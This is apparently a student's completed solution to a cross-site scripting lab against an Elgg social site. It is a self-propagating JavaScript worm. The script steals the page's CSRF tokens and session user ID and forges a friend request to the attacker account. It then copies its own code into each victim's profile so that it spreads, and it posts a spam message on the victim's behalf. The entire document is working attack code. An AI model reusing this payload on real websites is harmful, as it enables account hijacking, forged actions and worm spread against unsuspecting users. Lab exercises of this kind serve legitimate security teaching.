<script id=worm>
	window.onload = function () {
	// I merged the codes of three tasks  together
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	alert(jsCode);

	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var guid = elgg.session.user.guid;
    console.log(token);
	//Construct the HTTP request to add Samy as a friend.
    var sendurl= "/action/friends/add?friend=47"+ts+token+ts+token; //FILL IN

	//Create and send Ajax request to add friend
	if(guid!=47)
		{
        
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
		}


	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	
	var name = elgg.session.user.name;
	
	//Construct the content of your url.
    var sendurl= "/action/profile/edit"; //FILL IN
	var content= token+ts+"&name="+name+"&description="+wormCode+"&accesslevel%5Bdescription%5D=1&briefdescription=1605093&accesslevel%5Bbriefdescription%5D=1&location=Bangladesh&accesslevel%5Blocation%5D=1&interests=Gaming&accesslevel%5Binterests%5D=1&skills=JavaScript&accesslevel%5Bskills%5D=1&contactemail=samy@gmail.com&accesslevel%5Bcontactemail%5D=1&phone=+880123456789&accesslevel%5Bphone%5D=1&mobile=555&accesslevel%5Bmobile%5D=1&website=www.samy.com&accesslevel%5Bwebsite%5D=1&twitter=twitter/samy&accesslevel%5Btwitter%5D=1&guid="+guid; //FILL IN
	//here I added the wormcode into victims description
	if(guid!=47)
		{
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	
	
	var post = "&body="+"To earn 12 USD/Hour(!), visit " + "http://www.xsslabelgg.com/profile/samy";
	//Construct the content of your url.
    var sendurl= "/action/thewire/add"; //FILL IN
	var content= token+ts+post; //FILL IN
	
	if(guid!=47)
		{
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>

